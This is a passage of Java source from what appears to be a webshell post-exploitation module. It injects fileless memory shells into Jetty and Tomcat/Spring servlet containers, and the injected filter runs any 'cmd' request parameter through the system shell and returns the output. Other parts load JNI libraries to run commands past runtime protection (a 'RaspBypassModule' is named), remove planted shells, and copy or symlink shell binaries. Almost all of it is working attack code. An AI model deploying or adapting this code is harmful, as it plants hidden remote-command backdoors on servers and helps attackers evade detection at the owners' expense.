            final Class<?> filterIfc = memShellServletApi("javax.servlet.Filter", "jakarta.servlet.Filter");
            if (filterIfc == null) {
                sb.append("[-] Servlet Filter API missing\n");
                return sb.toString();
            }
            ClassLoader proxyCl = filterIfc.getClassLoader();
            if (proxyCl == null) {
                proxyCl = Thread.currentThread().getContextClassLoader();
            }
            final String jettyFilterName = MEM_FILTER_PREFIX + "Jetty_" + Integer.toHexString(urlPath != null ? urlPath.hashCode() : 0);
            String base = (urlPath != null && !urlPath.trim().isEmpty()) ? urlPath.trim() : "/*";
            if (!base.startsWith("/")) {
                base = "/" + base;
            }
            final String pathSpec = base.contains("*") ? base : base + "/*";
            
            InvocationHandler jettyFh = new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    String mn = method.getName();
                    if ("init".equals(mn) || "destroy".equals(mn)) {
                        return null;
                    }
                    if (!"doFilter".equals(mn) || args == null || args.length < 3) {
                        return null;
                    }
                    Object req = args[0];
                    Object res = args[1];
                    Object chain = args[2];
                    try {
                        String cmd = (String) req.getClass().getMethod("getParameter", String.class).invoke(req, "cmd");
                        if (cmd != null && !cmd.trim().isEmpty()) {
                            String[] command = System.getProperty("os.name").toLowerCase().contains("win")
                                ? new String[]{"cmd.exe", "/c", cmd.trim()}
                                : new String[]{"/bin/sh", "-c", cmd.trim()};
                            ProcessBuilder pb = new ProcessBuilder(command);
                            pb.redirectErrorStream(true);
                            Process p = pb.start();
                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
                            byte[] buf = new byte[4096];
                            int n;
                            while ((n = p.getInputStream().read(buf)) != -1) {
                                bos.write(buf, 0, n);
                            }
                            p.waitFor(60, TimeUnit.SECONDS);
                            try {
                                res.getClass().getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                            } catch (Exception ignored) {
                            }
                            try {
                                Object writer = res.getClass().getMethod("getWriter").invoke(res);
                                writer.getClass().getMethod("write", String.class).invoke(writer, new String(bos.toByteArray(), "UTF-8"));
                            } catch (Exception wex) {
                                Object os = res.getClass().getMethod("getOutputStream").invoke(res);
                                os.getClass().getMethod("write", byte[].class).invoke(os, bos.toByteArray());
                            }
                            return null;
                        }
                    } catch (Exception ignored) {
                    }
                    for (Method m : chain.getClass().getMethods()) {
                        if ("doFilter".equals(m.getName()) && m.getParameterCount() == 2) {
                            m.invoke(chain, req, res);
                            break;
                        }
                    }
                    return null;
                }
            };
            Object filterProxy = Proxy.newProxyInstance(proxyCl, new Class<?>[]{filterIfc}, jettyFh);
            
            Class<?> filterHolderClass = Class.forName("org.eclipse.jetty.servlet.FilterHolder");
            Object holder = null;
            try {
                Constructor<?> c = filterHolderClass.getConstructor(filterIfc);
                holder = c.newInstance(filterProxy);
            } catch (Exception e) {
                holder = filterHolderClass.getConstructor().newInstance();
                filterHolderClass.getMethod("setFilter", filterIfc).invoke(holder, filterProxy);
            }
            try {
                filterHolderClass.getMethod("setName", String.class).invoke(holder, jettyFilterName);
            } catch (Exception ignored) {
            }
            
            Class<?> filterMappingClass = Class.forName("org.eclipse.jetty.servlet.FilterMapping");
            Object mapping = filterMappingClass.getConstructor().newInstance();
            filterMappingClass.getMethod("setFilterName", String.class).invoke(mapping, jettyFilterName);
            try {
                filterMappingClass.getMethod("setPathSpec", String.class).invoke(mapping, pathSpec);
            } catch (Exception e) {
                filterMappingClass.getMethod("setPathSpecs", String[].class).invoke(mapping, (Object) new String[]{pathSpec});
            }
            
            boolean added = false;
            for (String mn : new String[]{"prependFilterMapping", "addFilterMapping", "insertFilter"}) {
                try {
                    for (Method m : servletHandler.getClass().getMethods()) {
                        if (!mn.equals(m.getName())) {
                            continue;
                        }
                        Class<?>[] pt = m.getParameterTypes();
                        if (pt.length == 2 && pt[0].isInstance(holder) && pt[1].isInstance(mapping)) {
                            m.invoke(servletHandler, holder, mapping);
                            added = true;
                            break;
                        }
                        if (pt.length == 1 && pt[0].isInstance(holder)) {
                            m.invoke(servletHandler, holder);
                            added = true;
                            break;
                        }
                    }
                } catch (Exception ignored) {
                }
                if (added) {
                    break;
                }
            }
            if (added) {
                sb.append("[+] Jetty FilterHolder + FilterMapping registered: ").append(jettyFilterName).append(" ").append(pathSpec).append("\n");
            } else {
                sb.append("[-] Could not match ServletHandler filter API for this Jetty version\n");
            }
        } catch (Exception e) {
            sb.append("[-] ").append(e.getMessage()).append("\n");
        }
        return sb.toString();
    }
    
    private String injectTomcatServlet(String urlPath) {
        return "[-] Tomcat Servlet: requires concrete Servlet class bytecode in container; use Tomcat Filter instead.\n"
            + "[+] Path requested: " + urlPath + "\n";
    }
    
    private String injectSpringController(String urlPath) {
        StringBuilder result = new StringBuilder();
        try {
            Object sc = memShellGetServletContext();
            if (sc != null && memShellGetStandardContext(sc) != null) {
                result.append("[*] Embedded Tomcat detected under Spring — using Tomcat Filter injection\n");
                result.append(injectTomcatFilter(urlPath));
                return result.toString();
            }
        } catch (Exception ignored) {
        }
        
        try {
            Class<?> requestContextHolderClass = Class.forName("org.springframework.web.context.request.RequestContextHolder");
            Method getRequestAttributesMethod = requestContextHolderClass.getMethod("getRequestAttributes");
            Object requestAttributes = getRequestAttributesMethod.invoke(null);
            
            if (requestAttributes != null) {
                result.append("[+] Spring RequestAttributes present\n");
                result.append("[!] No embedded StandardContext from this request — register Filter via Tomcat/Jetty tab or war layout\n");
                result.append("[+] Target path hint: ").append(urlPath).append("\n");
            } else {
                result.append("[-] RequestAttributes null (call from HTTP request thread)\n");
            }
        } catch (Exception e) {
            result.append("[-] Spring not available: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString();
    }
    
    private String injectVmAnonymousClass(String urlPath) {
        StringBuilder result = new StringBuilder();
        
        try {
            Field theUnsafeField = getDeclaredField(sun.misc.Unsafe.class, "theUnsafe");
            theUnsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            
            result.append("[+] VM Anonymous Class injection placeholder\n");
            result.append("[+] This method creates undetectable memory shell\n");
            result.append("[+] Path: " + urlPath + "\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    public byte[] removeMemShell() {
        String shellType = getString("shellType");
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        result.append("=== Remove memory shell ===\n");
        result.append("Type: ").append(shellType).append("\n");
        
        if (shellType != null && shellType.contains("Tomcat Filter")) {
            try {
                Object sc = memShellGetServletContext();
                if (sc == null) {
                    result.append("[-] No ServletContext\n");
                    return result.toString().getBytes();
                }
                Object standardContext = memShellGetStandardContext(sc);
                if (standardContext == null) {
                    result.append("[-] StandardContext not found\n");
                    return result.toString().getBytes();
                }
                String filterName = memShellFilterName(urlPath != null ? urlPath : "/shell");
                try {
                    Method rem = standardContext.getClass().getMethod("removeFilterDef", String.class);
                    rem.invoke(standardContext, filterName);
                    result.append("[+] removeFilterDef(").append(filterName).append(")\n");
                } catch (NoSuchMethodException e) {
                    result.append("[-] removeFilterDef not available on this Tomcat version\n");
                }
                try {
                    Method remMap = standardContext.getClass().getMethod("removeFilterMap", String.class);
                    remMap.invoke(standardContext, filterName);
                    result.append("[+] removeFilterMap(").append(filterName).append(")\n");
                } catch (Exception ignored) {
                }
            } catch (Exception e) {
                result.append("[-] ").append(e.getMessage()).append("\n");
            }
        } else {
            result.append("[!] Only Tomcat Filter removal by name is implemented; redeploy context to clear others\n");
        }
        return result.toString().getBytes();
    }

    // ==================== JNI Library Loading ====================
    
    public byte[] loadJniLibrary() {
        String soPath = getString("soPath");
        
        StringBuilder result = new StringBuilder();
        result.append("=== JNI Library Loading ===\n");
        result.append("Path: " + soPath + "\n\n");
        
        try {
            System.load(soPath);
            result.append("[+] Library loaded successfully!\n");
            jniLoaded = true;
            jniPath = soPath;
        } catch (UnsatisfiedLinkError e) {
            String m = e.getMessage() != null ? e.getMessage() : "";
            if (m.contains("already loaded")) {
                if (m.contains("another classloader")) {
                    result.append("[-] DLL \u5df2\u88ab\u5176\u4ed6 ClassLoader \u52a0\u8f7d\uff0c\u5f53\u524d\u63d2\u4ef6\u5b9e\u4f8b\u65e0\u6cd5\u7ed1\u5b9a JNI\u3002\u8bf7\u91cd\u8fde Shell \u6216\u91cd\u65b0\u6253\u5305\u6700\u65b0 payload\uff08include \u590d\u7528\u540c\u4e00 ClassLoader\uff09\u540e\u518d\u300c\u52a0\u8f7d JNI\u300d\u3002\n");
                    result.append("    ").append(m).append("\n");
                } else {
                    jniLoaded = true;
                    jniPath = soPath;
                    result.append("[+] \u5e93\u5df2\u5728\u672c ClassLoader \u52a0\u8f7d\uff0c\u8df3\u8fc7\u91cd\u590d load\n");
                }
            } else {
                result.append("[-] UnsatisfiedLinkError: ").append(m).append("\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }

    public byte[] execViaJni() {
        String cmd = getCommandLine();
        
        StringBuilder result = new StringBuilder();
        result.append("=== JNI Execution ===\n");
        result.append("Command: " + cmd + "\n\n");
        
        try {
            if (!jniLoaded) {
                result.append("[-] JNI library not loaded. Load first.\n");
                return result.toString().getBytes();
            }
            try {
                String nativeOut = jniExec(cmd);
                result.append(nativeOut != null ? nativeOut : "");
                return result.toString().getBytes();
            } catch (UnsatisfiedLinkError ule) {
                result.append("[!] jniExec \u672a\u7ed1\u5b9a\uff1a\u7c7b\u540d\u88ab\u968f\u673a\u5316\u540e\u4e0e DLL \u5bfc\u51fa\u7b26\u4e0d\u5339\u914d\uff08\u9700\u5ba2\u6237\u7aef\u4fdd\u7559 RaspBypassModule \u5168\u9650\u5b9a\u540d\uff09\u3002\u8be6\u60c5: ");
                result.append(ule.getMessage()).append("\n");
                result.append(new String(execTomcatJni(cmd)));
            }
        } catch (Throwable e) {
            result.append("[-] Error: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString().getBytes();
    }

    // ==================== Utility Tools ====================
    
    public byte[] copyBinary() {
        String srcPath = getString("srcPath");
        String dstPath = getString("dstPath");
        
        StringBuilder result = new StringBuilder();
        result.append("=== Copy Binary ===\n");
        result.append("Source: " + srcPath + "\n");
        result.append("Dest: " + dstPath + "\n\n");
        
        try {
            Path src = Paths.get(srcPath);
            Path dst = Paths.get(dstPath);
            
            Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            
            result.append("[+] Binary copied successfully!\n");
            result.append("[+] You can now use: " + dstPath + " -c 'command'\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }

    public byte[] createSymlink() {
        String srcPath = getString("srcPath");
        String dstPath = getString("dstPath");
        
        StringBuilder result = new StringBuilder();
        result.append("=== Create Symlink ===\n");
        result.append("Source: " + srcPath + "\n");
        result.append("Dest: " + dstPath + "\n\n");
        
        try {
            Path src = Paths.get(srcPath);
            Path dst = Paths.get(dstPath);
            
            Files.createSymbolicLink(dst, src);
            
            result.append("[+] Symlink created successfully!\n");
            result.append("[+] You can now use: " + dstPath + " -c 'command'\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }

    // ==================== Helper Methods ====================
    
    private String[] buildCommand(String cmd) {
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            return new String[]{"cmd.exe", "/c", cmd};
        } else {
            return new String[]{"/bin/sh", "-c", cmd};
        }
    }
    
    private byte[] readStream(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = in.read(buffer)) != -1) {
            out.write(buffer, 0, bytesRead);
        }
        return out.toByteArray();
    }
    
    private byte[] toCString(String s) {
        if (s == null) return null;
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    
    private Field getDeclaredField(Class<?> clazz, String name) throws NoSuchFieldException {
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(name);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }
    
    private Method getDeclaredMethod(Class<?> clazz, String name, Class<?>... parameterTypes) 
            throws NoSuchMethodException {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(name, parameterTypes);
                return method;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchMethodException(name);
    }
    
    private String getStackTrace(Throwable e) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString();
    }
}
